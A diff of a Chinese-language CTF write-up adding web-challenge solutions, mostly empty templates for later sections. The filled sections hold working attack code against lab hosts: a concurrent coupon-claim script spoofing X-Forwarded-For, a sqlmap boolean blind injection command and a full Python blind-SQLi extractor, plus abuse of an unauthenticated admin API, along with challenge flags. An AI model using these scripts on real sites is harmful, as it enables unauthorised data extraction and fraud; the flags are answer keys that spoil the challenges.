@@ -773,9 +773,9 @@ async function postMsg() {
 
 id 用的是 uuid，所以按序号猜 id 的可能性不大。不过 uuid 已经在前端暴露，可以直接利用。
 
-ctrl+u 打开源码，ctrl+f 搜网页里能看到的私密留言的部分 uuid `b2c3d4e5` ，可以直接拿到 admin 的 uuid `b2c3d4e5-f6a7-4b8c-9d0e-1f2a3b4c5d6e` 。
+ctrl+u 打开源码，ctrl+f 搜网页里能看到的私密留言的部分 uuid `b2c3d4e5` ，可以直接拿到 admin 的 uuid `b2c3d4e5-f6a7-4b8c-9d0e-1f2a3b4c5d6e` 。
 
-前端源码 js 里的注释已经暗示——存在不正常的、鉴权不健全的接口。从源码里搜关键词 `fetch` ，可以找到用了哪些接口（api），然后发现 `/api/MGetMessages` 这个 api 是没有鉴权的，请求体长 `{message_ids: ids}` 这个样子，`ids` 参数传入的是一个 uuid 数组，而且支持 `application/json` 格式的 post 请求。
+前端源码 js 里的注释已经暗示——存在不正常的、鉴权不健全的接口。从源码里搜关键词 `fetch` ，可以找到用了哪些接口（api），然后发现 `/api/MGetMessages` 这个 api 是没有鉴权的，请求体长 `{message_ids: ids}` 这个样子，`ids` 参数传入的是一个 uuid 数组，而且支持 `application/json` 格式的 post 请求。
 
 那么，hackbar 里如下图发一个 post 请求，即可得到 flag。
 
@@ -800,7 +800,570 @@ ctrl+u 打开源码，ctrl+f 搜网页里能看到的私密留言的部分 uuid 
 
 ---
 
-### 09. 
+### 09. 4048【简单】
+
+*📌Question :*
+
+```text
+一款有趣的数字合成小游戏，传闻达成特定分数，便能解锁隐藏的馈赠。但是
+通往奖励的道路往往不止一条。
+```
+
+![09-01](./images/img-20260928151842_msedge_compressed.jpg)
+
+
+
+*📌Solution :*
+
+ctrl+u 看源码，没什么特别的，下面 `<script>` 部分引入了3个 js，挨个儿点开看一下。
+
+在 `game.js` 中往下滑，发现可疑的函数 `checkWin()` ：
+
+```js
+// Check victory
+function checkWin() {
+    if (winFlagShown) return;
+    if (score === 4048) {
+        winFlagShown = true;
+        statusBadge.textContent = document.querySelector('#winModal h2').textContent;
+        statusBadge.style.color = '#ffd700';
+        showWinModal();
+        const ENCODED_FLAG = '0x50, 0x4b, 0x57, 0x43, 0x54, 0x46, 0x7b, 0x36, 0x66, 0x31, 0x35, 0x61, 0x63, 0x35, 0x65, 0x2d, 0x64, 0x37, 0x66, 0x63, 0x2d, 0x34, 0x62, 0x32, 0x61, 0x2d, 0x62, 0x38, 0x34, 0x37, 0x2d, 0x38, 0x31, 0x36, 0x32, 0x36, 0x64, 0x62, 0x37, 0x63, 0x36, 0x38, 0x39, 0x7d';
+        const byteStrArr = ENCODED_FLAG.split(',').map(s => s.trim().replace(/^0x/,''));
+        const realHex = byteStrArr.join('');
+        const decoded = window.__Jsfuck.decode(realHex);
+        console.log('score = 4048,Flag :', decoded);
+        flagDisplay.textContent = decoded;
+        modalOverlay.classList.add('active');
+    }
+}
+```
+
+这直接就有 flag 了， `0x` 开头是十六进制，cyberchef 里 from hex 解码一下，即可。
+
+
+
+*📌FLAG :*
+
+`PKWCTF{6f15ac5e-d7fc-4b2a-b847-81626db7c689}`
+
+
+
+*📌Summary :*
+
+- 认真读源码。
+- 对 js 的基本了解。
+- `0x` 开头是十六进制。
+
+---
+
+### 10. 一券难求【简单】
+
+*📌Question :*
+
+```text
+蜜茶私藏·神秘特调
+```
+
+```html
+<!--前端源码主要部分-->
+
+<body>
+<header>
+  <div class="brand">🧋 蜜茶雪姐<small>校园旗舰店</small></div>
+  <nav>
+    <a href="/">商城</a>
+    <a href="/coupons">新生专享</a>
+    <a href="/orders">我的订单</a>
+  </nav>
+  <div class="spacer"></div>
+  <div class="userbox">
+    
+      <span class="balance">余额 ¥100</span>
+      <span>qweqwe</span>
+      <a href="/logout" style="color:#fff">退出</a>
+    
+  </div>
+</header>
+<main>
+  
+  
+  
+<div class="banner">
+  <h2>🧋 新生专享：满 100 减 50</h2>
+  <p>新生专享：满 100 减 50 券，每人限找蜜茶雪姐领 1 张，单笔订单限用 2 张，先到先得。</p>
+  <p><a href="/coupons">去领券 »</a></p>
+</div>
+<div class="cardgrid">
+  
+  <div class="card">
+    <h3>雪姐私藏·神秘特调</h3>
+    <p class="price">¥200</p>
+    <p class="desc">含神秘兑换码，全店唯一，先到先得</p>
+    
+    <form method="post" action="/order/create">
+      <input type="hidden" name="item_id" value="1">
+      
+      <button type="submit">立即购买</button>
+    </form>
+    
+  </div>
+  
+  <div class="card">
+    <h3>芋泥波波厚乳鲜奶</h3>
+    <p class="price">¥18</p>
+    <p class="desc">绵密芋泥 + 现打波波，新生人气 No.1</p>
+    
+    <form method="post" action="/order/create">
+      <input type="hidden" name="item_id" value="2">
+      
+      <button type="submit">立即购买</button>
+    </form>
+    
+  </div>
+  
+  <div class="card">
+    <h3>雪王柠檬水（校园平替版）</h3>
+    <p class="price">¥4</p>
+    <p class="desc">酸甜解腻，¥4 你敢信</p>
+    
+    <form method="post" action="/order/create">
+      <input type="hidden" name="item_id" value="3">
+      
+      <button type="submit">立即购买</button>
+    </form>
+    
+  </div>
+  
+</div>
+
+</main>
+<footer>蜜茶雪姐 · 校园店 | 你爱我，我爱你，蜜茶雪姐甜蜜蜜 🎵</footer>
+<!-- 运维备注：本站经反向代理回源，源站依据 X-Forwarded-For 头识别真实客户端 IP -->
+</body>
+```
+
+```html
+<!--领券接口的前端源码-->
+
+<div class="banner">
+  <h2>🎁 新生专享 · 领券找雪姐</h2>
+  <p>新生专享：满 100 减 50 券，每人限找蜜茶雪姐领 1 张，单笔订单限用 2 张，先到先得。</p>
+  <form method="post" action="/coupon/claim">
+    <button type="submit">找雪姐领券 🎫</button>
+  </form>
+</div>
+```
+
+
+
+*📌Solution :*
+
+“满 100 减 50 券，每人限找蜜茶雪姐领 1 张，单笔订单限用 2 张”，我的余额是100元，而“雪姐私藏·神秘特调”是200元。所以目标是拿到 2 张券。
+
+那么想到可能会用并发 post 请求——趁程序没反应过来的时候同时发多个 post 请求，就能拿到多个优惠券。源码里写了“依据 X-Forwarded-For 头识别真实客户端 IP”，所以大概率是针对 ip 风控的，但可以通过改 `X-Forwarded-For` 头让服务器以为是多个ip。
+
+使用 curl 来完成这个工作：
+
+```bash
+url='http://8000-0fe9e7aa-a764-4192-9333-733105456b3e.challenge.ctfplus.cn/'
+cookie='session=eyJ1aWQiOjJ9.arpTiw.znF9eacJwEcoMT8NTnq8jGysnAs'  # 这里粘贴登录后 cookie 完整值
+
+for i in 1 2 3 4; do
+  curl -s -b "$cookie" -X POST "$url/coupon/claim" \
+    -H "X-Forwarded-For: 111.112.113.$((100+i))" &
+done
+wait
+```
+
+或者写一个 python 脚本来完成这个工作：
+
+```python
+import threading, requests
+
+URL = "http://8000-0fe9e7aa-a764-4192-9333-733105456b3e.challenge.ctfplus.cn/"
+COOKIE = {"session": "eyJ1aWQiOjJ9.arpTiw.znF9eacJwEcoMT8NTnq8jGysnAs"}  # 这里粘贴登录后 cookie 里 session 的值
+N = 4
+
+def claim(i):
+    r = requests.post(f"{URL}/coupon/claim",
+                      cookies=COOKIE,
+                      headers={"X-Forwarded-For": f"111.112.113.{100+i}"})
+    print(i, r.text.strip())
+
+ts = [threading.Thread(target=claim, args=(i,)) for i in range(N)]
+[t.start() for t in ts]
+[t.join() for t in ts]
+```
+
+运行后，返回网页里，刷新一下会发现多了很多优惠券。
+
+![10-01](./images/img-20260928194843_msedge_compressed.jpg)
+
+左边这个选两个优惠券然后点立即购买，即可。
+
+
+
+*📌FLAG :*
+
+`PKWCTF{b21c30e0-d72b-4a98-8a2f-919d7bbd1ce5}`
+
+
+
+*📌Summary :*
+
+- 有些站点会完全信任 `X-Forwarded-For` 的值作为访问者的 ip。
+- 瞬间的并发请求有时能绕过一些不严谨的限制。
+- curl 和 python threading, requests 库的基本用法。
+
+---
+
+### 11. 丢标的报价【简单】
+
+*📌Question :*
+
+```text
+滨江智慧园区项目丢标，疑似报价提前泄露。前 CEO 留下的一笔报价记录单独归档， 但系统只回你"存在"或"不存在"——没有数据、没有报错、没有回显。 把那个数字问出来。
+```
+
+![11-01](./images/img-20260928200713_msedge_compressed.jpg)
+
+
+
+*📌Solution_0 :*
+
+一看大概率就是 sql 注入。
+
+先试一些基本语句拿信息。实测发现，回显只会显示 yes or no（一个只能回答对或不对的神），那么就是 **布尔盲注**，可以把 flag 一个字符一个字符地“问”出来，而用二分法试一个字符的 ASCII 码（取值范围是 32~126）的话，最坏情况下约 7 次就能试出来，所以这部分的尝试次数是可控的。
+
+输入 `1'` ，回显 no，说明是数值型，注入时不用单独加引号。
+
+输入 `1 AND @@version>0` ，回显 yes，输入 `1 AND sqlite_version()>0` ，回显 no，说明数据库是 mysql 而不是 sqlite 。
+
+进入 kali，用 sqlmap：
+
+```bash
+sqlmap -u "http://8080-3fe90ee5-ffe2-4b53-8f81-ef5093b818a6.challenge.ctfplus.cn/?project=1" \
+  -p project \
+  --batch \
+  --flush-session \
+  --technique=B \
+  --dbms=mysql \
+  --string="YES 已归档"
+```
+
+参数解读：
+
+| 参数                    | 翻译                                                  |
+| ----------------------- | :---------------------------------------------------- |
+| `-u "…?project=1"`      | 目标 url。 `project=1` 是一个“存在”的正常值，便于对比 |
+| `-p project`            | 只测 `project` 这个参数                               |
+| `--batch`               | 全程不问问题、自动选默认                              |
+| `--flush-session`       | 清掉 sqlmap 之前的缓存结果，避免旧会话干扰            |
+| `--technique=B`         | 只用 **B**oolean 布尔盲注                             |
+| `--dbms=mysql`          | 已手工确认是 MySQL                                    |
+| `--string="YES 已归档"` | 响应里出现这个字符串才判定为命中                      |
+
+flag 就在输出目录里的 `dump/ctf2/secret_bids.csv` 文件中。
+
+
+
+*📌Solution_1 :*
+
+AI 写一个二分法 python 模板然后改一改：
+
+```python
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+"""布尔盲注自动提取：二分 + HTTP 真值 oracle"""
+import urllib.parse
+import urllib.request
+import sys
+
+BASE = "http://8080-3fe90ee5-ffe2-4b53-8f81-ef5093b818a6.challenge.ctfplus.cn/"
+TIMEOUT = 15
+req_count = 0
+
+
+def check(payload: str) -> bool:
+    """把 payload 塞进 project 参数，用页面 YES/NO 当真理 oracle"""
+    global req_count
+    req_count += 1
+    q = urllib.parse.urlencode({"project": payload})
+    url = BASE + "?" + q
+    with urllib.request.urlopen(url, timeout=TIMEOUT) as r:
+        body = r.read().decode("utf-8", "replace")
+    return "result hit" in body
+
+
+def extract_int(expr: str, max_n: int = 50) -> int:
+    """二分求 expr 的整数结果（假定 0..max_n）"""
+    lo, hi = 0, max_n
+    while lo < hi:
+        mid = (lo + hi) // 2
+        if check(f"1 AND (({expr})>{mid})"):
+            lo = mid + 1
+        else:
+            hi = mid
+    return lo
+
+
+def extract_str(expr: str, max_len: int = 80) -> str:
+    length = extract_int(f"LENGTH(({expr}))", max_len)
+    print(f"    length={length}, requests so far={req_count}", flush=True)
+    out = []
+    for i in range(1, length + 1):
+        lo, hi = 32, 126  # 可打印 ASCII
+        while lo < hi:
+            mid = (lo + hi) // 2
+            if check(f"1 AND (ASCII(SUBSTRING(({expr}),{i},1))>{mid})"):
+                lo = mid + 1
+            else:
+                hi = mid
+        out.append(chr(lo))
+        print(f"    [{i}/{length}] {''.join(out)}", flush=True)
+    return "".join(out)
+
+
+def main():
+    print("=== 1. 当前库名 ===", flush=True)
+    db = extract_str("SELECT DATABASE()", 30)
+    print(f"DB = {db!r}", flush=True)
+
+    print("=== 2. 表 ===", flush=True)
+    n = extract_int(
+        "(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=DATABASE())",
+        20,
+    )
+    print(f"table count = {n}", flush=True)
+    tables = []
+    for i in range(n):
+        t = extract_str(
+            f"SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT {i},1",
+            40,
+        )
+        print(f"TABLE[{i}] = {t!r}", flush=True)
+        tables.append(t)
+
+    print("=== 3. 列 ===", flush=True)
+    for tbl in tables:
+        cn = extract_int(
+            f"(SELECT COUNT(*) FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='{tbl}')",
+            20,
+        )
+        print(f"--- {tbl}: {cn} columns ---", flush=True)
+        for j in range(cn):
+            c = extract_str(
+                f"SELECT column_name FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='{tbl}' ORDER BY ordinal_position LIMIT {j},1",
+                40,
+            )
+            print(f"  COL[{j}] = {c!r}", flush=True)
+
+    print("=== 4. secret_bids 行 ===", flush=True)
+    rc = extract_int("(SELECT COUNT(*) FROM secret_bids)", 10)
+    print(f"secret_bids rows = {rc}", flush=True)
+    for i in range(rc):
+        print(f"-- secret_bids[{i}] --", flush=True)
+        print(f"id = {extract_int(f'(SELECT id FROM secret_bids LIMIT {i},1)', 20)}", flush=True)
+        print(f"project = {extract_str(f'(SELECT project FROM secret_bids LIMIT {i},1)', 80)!r}", flush=True)
+        print(f"bid_price = {extract_str(f'(SELECT bid_price FROM secret_bids LIMIT {i},1)', 120)!r}", flush=True)
+
+    print("=== 5. projects 行 ===", flush=True)
+    prc = extract_int("(SELECT COUNT(*) FROM projects)", 20)
+    print(f"projects rows = {prc}", flush=True)
+    for i in range(prc):
+        print(f"-- projects[{i}] --", flush=True)
+        print(f"id = {extract_int(f'(SELECT id FROM projects LIMIT {i},1)', 20)}", flush=True)
+        print(f"project = {extract_str(f'(SELECT project FROM projects LIMIT {i},1)', 80)!r}", flush=True)
+        print(f"owner = {extract_str(f'(SELECT owner FROM projects LIMIT {i},1)', 40)!r}", flush=True)
+        print(f"status = {extract_str(f'(SELECT status FROM projects LIMIT {i},1)', 40)!r}", flush=True)
+
+    print(f"\n=== DONE, total HTTP requests = {req_count} ===", flush=True)
+
+
+if __name__ == "__main__":
+    main()
+```
+
+
+
+*📌FLAG :*
+
+`PKWCTF{e921960d-ad4d-442a-b1e2-9bcdf20f196b}`
+
+
+
+*📌Summary :*
+
+- 了解 sql 注入中的 布尔盲注，以及二分法在其中的应用。
+- 了解 sqlmap 工具的用法。
+
+---
+
+### 12. PKW学院【简单】
+
+*📌Question :*
+
+```text
+接口？这是什么
+```
+
+![12-01](./images/img-20260928202753_msedge_compressed.jpg)
+
+
+
+*📌Solution_0 :*
+
+ctrl+u 发现底部有奇怪注释：
+
+```html
+<!--
+      ============================================================
+      开发备注（TODO: 正式上线前请删除此注释块）
+      ============================================================
+      - 教务系统API文档地址：/api/v1/
+      - 管理控制台入口：/console （已配置IP白名单，仅限校内网络访问）
+      - 控制台访问码：见学生信息备注字段（API接口可查）
+      - API接口均未做前端鉴权，后端已加Token验证（待联调）
+      - 学生初始密码规则：身份证后六位，已在公告中通知
+      - 最后更新：2026-08-15 by 张开发
+      - 审核人：李运维（已确认无敏感信息泄露）
+      ============================================================
+    -->
+```
+
+访问 `/api/v1/` ，发现一坨 json，全选复制到 vscode 里格式化一下，然后发现一堆 unicode 代码，就再全选复制一下，到 cyberchef 里 `Unescape Unicode Characters` 解码一下（output 区域换成 utf8），再复制回 vscode 查看。再次得到重磅信息：
+
+```json
+{
+    "description": "教务系统开放接口，供前端调用",
+    "endpoints": [
+        {
+            "desc": "API入口，返回接口列表",
+            "method": "GET",
+            "path": "/api/v1/"
+        },
+        {
+            "desc": "获取学生列表（含详细信息）",
+            "method": "GET",
+            "path": "/api/v1/students"
+        },
+        {
+            "desc": "新增学生",
+            "method": "POST",
+            "path": "/api/v1/students"
+        },
+        {
+            "desc": "更新学生信息",
+            "method": "PUT",
+            "path": "/api/v1/students/<id>"
+        },
+        {
+            "desc": "删除学生",
+            "method": "DELETE",
+            "path": "/api/v1/students/<id>"
+        },
+        {
+            "desc": "获取学生详情",
+            "method": "GET",
+            "path": "/api/v1/students/<id>"
+        },
+        {
+            "desc": "获取教师列表",
+            "method": "GET",
+            "path": "/api/v1/teachers"
+        },
+        {
+            "desc": "获取课程列表",
+            "method": "GET",
+            "path": "/api/v1/courses"
+        },
+        {
+            "desc": "获取成绩列表",
+            "method": "GET",
+            "path": "/api/v1/scores"
+        },
+        {
+            "desc": "获取系统信息（含控制台配置）",
+            "method": "GET",
+            "path": "/api/v1/system/info"
+        },
+        {
+            "desc": "获取环境变量（需参数name）",
+            "method": "GET",
+            "path": "/api/v1/admin/env"
+        },
+        {
+            "desc": "获取操作日志",
+            "method": "GET",
+            "path": "/api/v1/admin/logs"
+        }
+    ],
+    "name": "PKW学院教务管理系统 API",
+    "note": "部分接口需要管理员权限，请在请求头中携带 Authorization Token",
+    "version": "v1.0"
+}
+```
+
+最后说的这个要带 token 不一定需要，因为前面说了“待联调”。
+
+直接访问 `/api/v1/admin/env` 看一下，竟然返回：
+
+```json
+{"code":400,"message":"请指定环境变量名称，如 ?name=APP_SECRET"}
+```
+
+这还说啥了，直接带上这个参数访问，发现它还真没鉴权，返回的是：
+
+```json
+{
+    "code": 0,
+    "data": {
+        "description": "应用密钥，系统启动时自动生成，Base64编码存储，用于数据加密和身份验证",
+        "encoding": "base64",
+        "hint": "值已Base64编码，请解码后使用",
+        "loaded_at": "container_startup",
+        "name": "APP_SECRET",
+        "source": "/app/flag.txt",
+        "value": "UEtXQ1RGezRkYWFkNmFiLWNkZDQtNDlkNC04YmVhLWIxYWEwYzllODMzN30="
+    },
+    "message": "success"
+}
+```
+
+base64 解码即可。
+
+
+
+*📌Solution_1 :*
+
+访问 `/api/v1/system/info` 看一下系统信息，发现访问控制台的请求示例 `/console?adm_token=your_access_code` 。
+
+想要控制台访问码，按前面注释去查学生信息备注字段。访问 `/api/v1/students` ，重复上面格式化操作，拿到访问码 `pkw_console_2026` 。
+
+访问 `/console?adm_token=pkw_console_2026` ，竟然进到了后台管理页面。
+
+左侧 系统配置——环境变量——查看，然后 base64 解码即可。
+
+![12-02](./images/img-20260929012009_msedge_compressed.jpg)
+
+
+
+*📌FLAG :*
+
+`PKWCTF{4daad6ab-cdd4-49d4-8bea-b1aa0c9e8337}`
+
+
+
+*📌Summary :*
+
+- 处理不易读的 json、unicode。
+- 先试探鉴权。
+- 了解 get 请求基本知识。
+
+---
+
+### 13. 元素属性【简单】
 
 *📌Question :*
 
@@ -826,7 +1389,7 @@ ctrl+u 打开源码，ctrl+f 搜网页里能看到的私密留言的部分 uuid 
 
 ---
 
-### 10. 
+### 14. probe【简单】
 
 *📌Question :*
 
@@ -852,7 +1415,7 @@ ctrl+u 打开源码，ctrl+f 搜网页里能看到的私密留言的部分 uuid 
 
 ---
 
-### 11. 
+### 15. 老机房的遗留系统【简单】
 
 *📌Question :*
 
@@ -878,7 +1441,7 @@ ctrl+u 打开源码，ctrl+f 搜网页里能看到的私密留言的部分 uuid 
 
 ---
 
-### 12. 
+### 16. 小虎鲸的银行账户【简单】
 
 *📌Question :*
 
@@ -904,7 +1467,7 @@ ctrl+u 打开源码，ctrl+f 搜网页里能看到的私密留言的部分 uuid 
 
 ---
 
-### 13. 
+### 17. Linux之旅【中等】
 
 *📌Question :*
 
@@ -930,7 +1493,7 @@ ctrl+u 打开源码，ctrl+f 搜网页里能看到的私密留言的部分 uuid 
 
 ---
 
-### 14. 
+### 18. 小虎鲸的文档库【中等】
 
 *📌Question :*
 
@@ -956,7 +1519,7 @@ ctrl+u 打开源码，ctrl+f 搜网页里能看到的私密留言的部分 uuid 
 
 ---
 
-### 15. 
+### 19. 仓库中的圈套【中等】
 
 *📌Question :*
 
@@ -982,7 +1545,7 @@ ctrl+u 打开源码，ctrl+f 搜网页里能看到的私密留言的部分 uuid 
 
 ---
 
-### 16. 
+### 20. 魔术链【中等】
 
 *📌Question :*
 
@@ -1008,7 +1571,7 @@ ctrl+u 打开源码，ctrl+f 搜网页里能看到的私密留言的部分 uuid 
 
 ---
 
-### 17. 
+### 21. 茉莉蜜茶【中等】
 
 *📌Question :*
 
@@ -1034,7 +1597,7 @@ ctrl+u 打开源码，ctrl+f 搜网页里能看到的私密留言的部分 uuid 
 
 ---
 
-### 18. 
+### 22. 客服工作台【中等】
 
 *📌Question :*
 
@@ -1060,7 +1623,7 @@ ctrl+u 打开源码，ctrl+f 搜网页里能看到的私密留言的部分 uuid 
 
 ---
 
-### 19. 
+### 23. 燕园论坛【中等】
 
 *📌Question :*
 
@@ -1086,7 +1649,7 @@ ctrl+u 打开源码，ctrl+f 搜网页里能看到的私密留言的部分 uuid 
 
 ---
 
-### 20. 
+### 24. 教务系统【中等】
 
 *📌Question :*
 
@@ -1112,111 +1675,7 @@ ctrl+u 打开源码，ctrl+f 搜网页里能看到的私密留言的部分 uuid 
 
 ---
 
-### 21. 
-
-*📌Question :*
-
-
-
-
-
-*📌Solution :*
-
-
-
-
-
-*📌FLAG :*
-
-
-
-
-
-*📌Summary :*
-
-
-
----
-
-### 22. 
-
-*📌Question :*
-
-
-
-
-
-*📌Solution :*
-
-
-
-
-
-*📌FLAG :*
-
-
-
-
-
-*📌Summary :*
-
-
-
----
-
-### 23. 
-
-*📌Question :*
-
-
-
-
-
-*📌Solution :*
-
-
-
-
-
-*📌FLAG :*
-
-
-
-
-
-*📌Summary :*
-
-
-
----
-
-### 24. 
-
-*📌Question :*
-
-
-
-
-
-*📌Solution :*
-
-
-
-
-
-*📌FLAG :*
-
-
-
-
-
-*📌Summary :*
-
-
-
----
-
-### 25. 
+### 25. One Click Trip【大师】
 
 *📌Question :*
 
@@ -1268,35 +1727,381 @@ PKWCTF{The_mo0n_1s_be3ut1ful_tOnigh7!!!}
 
 - 我爱打习题爱抚但我是爱死不是爱慕。。。 :D
 
-
-
 ## 0x02 -> Re
 
+### 27. 糖衣炮弹【入门】
 
+*📌Question :*
+
+
+
+
+
+*📌Solution :*
+
+
+
+
+
+*📌FLAG :*
+
+
+
+
+
+*📌Summary :*
+
+
+
+---
+
+### 28. gogogo！出发咯【入门】
+
+*📌Question :*
+
+
+
+
+
+*📌Solution :*
+
+
+
+
+
+*📌FLAG :*
+
+
+
+
+
+*📌Summary :*
+
+
+
+---
+
+### 29. 澳门新葡京【简单】
+
+*📌Question :*
+
+
+
+
+
+*📌Solution :*
+
+
+
+
+
+*📌FLAG :*
+
+
+
+
+
+*📌Summary :*
+
+
+
+---
+
+### 30. 暗号断点【简单】
+
+*📌Question :*
+
+
+
+
+
+*📌Solution :*
+
+
+
+
+
+*📌FLAG :*
+
+
+
+
+
+*📌Summary :*
+
+
+
+---
+
+### 31. 大鱼吃小鱼【简单】
+
+*📌Question :*
+
+
+
+
+
+*📌Solution :*
+
+
+
+
+
+*📌FLAG :*
+
+
+
+
+
+*📌Summary :*
+
+
+
+---
+
+### 32. 与旧日对话·第一章【简单】
+
+*📌Question :*
+
+
+
+
+
+*📌Solution :*
+
+
+
+
+
+*📌FLAG :*
+
+
+
+
+
+*📌Summary :*
 
 
 
 ## 0x03 -> Pwn
 
+👇⚠️⚠️⚠️👇
 
+NVlpcjU1eUw1THFHNkwrWjVZUy81WldsNUx1VzVaYTE1TG1mNkk2cjViNlg1WldLNVpXSzVaV0s1WldLNVpXSzVaV0s1WldLNVpXSzVaV0s1WldLNVpXSzVaV0s1WldLNVpXSzVaV0s1WldLNVpXSzVaV0s1WldLNVpXSzVaV0s1WldL
 
-
+:D
 
 ## 0x04 -> Crypto
 
+### 33. PKWSEC 入职考核机【入门】
 
+*📌Question :*
+
+
+
+
+
+*📌Solution :*
+
+
+
+
+
+*📌FLAG :*
+
+
+
+
+
+*📌Summary :*
+
+
+
+---
+
+### 34. Lucky Machine【入门】
+
+*📌Question :*
+
+
+
+
+
+*📌Solution :*
+
+
+
+
+
+*📌FLAG :*
+
+
+
+
+
+*📌Summary :*
 
 
 
 ## 0x05 -> Misc
 
+### 35. 你瞅啥【入门】
 
+*📌Question :*
+
+
+
+
+
+*📌Solution :*
+
+
+
+
+
+*📌FLAG :*
+
+
+
+
+
+*📌Summary :*
+
+
+
+---
+
+### 36. De-Fusion【入门】
+
+*📌Question :*
+
+
+
+
+
+*📌Solution :*
+
+
+
+
+
+*📌FLAG :*
+
+
+
+
+
+*📌Summary :*
+
+
+
+---
+
+### 37. pyjail-沉鱼【入门】
+
+*📌Question :*
+
+
+
+
+
+*📌Solution :*
+
+
+
+
+
+*📌FLAG :*
+
+
+
+
+
+*📌Summary :*
+
+
+
+---
+
+### 38. pyjail-落雁【简单】
+
+*📌Question :*
+
+
+
+
+
+*📌Solution :*
+
+
+
+
+
+*📌FLAG :*
+
+
+
+
+
+*📌Summary :*
+
+
+
+---
+
+### 39. pyjail-惊鸿【简单】
+
+*📌Question :*
+
+
+
+
+
+*📌Solution :*
+
+
+
+
+
+*📌FLAG :*
+
+
+
+
+
+*📌Summary :*
+
+
+
+---
+
+### 40. 静谧之眼【简单】
+
+*📌Question :*
+
+
+
+
+
+*📌Solution :*
+
+
+
+
+
+*📌FLAG :*
+
+
+
+
+
+*📌Summary :*
 
 
 
 ## 0x06 -> AI
 
-### 小锐【简单】
+### 41. 小锐【简单】
 
 *📌Question :*
 
@@ -1366,7 +2171,7 @@ What is 1+1?
 
 ---
 
-### 小锐 · 招新数据台【简单】
+### 42. 小锐 · 招新数据台【简单】
 
 *📌Question :*
 
@@ -1392,7 +2197,7 @@ What is 1+1?
 
 ---
 
-### 小锐 · RAG【简单】
+### 43. 小锐 · RAG【简单】
 
 *📌Question :*
 
@@ -1418,7 +2223,7 @@ What is 1+1?
 
 ---
 
-### 小锐 · 长期记忆【简单】
+### 44. 小锐 · 长期记忆【简单】
 
 *📌Question :*
 
@@ -1444,7 +2249,7 @@ What is 1+1?
 
 ---
 
-### 小锐· 插件系统【简单】
+### 45. 小锐· 插件系统【简单】
 
 *📌Question :*
 
@@ -1470,7 +2275,7 @@ What is 1+1?
 
 ---
 
-### 小锐 · 内部知识库【中等】
+### 46. 小锐 · 内部知识库【中等】
 
 *📌Question :*
 
@@ -1498,5 +2303,25 @@ What is 1+1?
 
 ## 0x07 -> OSINT
 
+### 47. osint-1【简单】
 
+*📌Question :*
+
+
+
+
+
+*📌Solution :*
+
+
+
+
+
+*📌FLAG :*
+
+
+
+
+
+*📌Summary :*
 
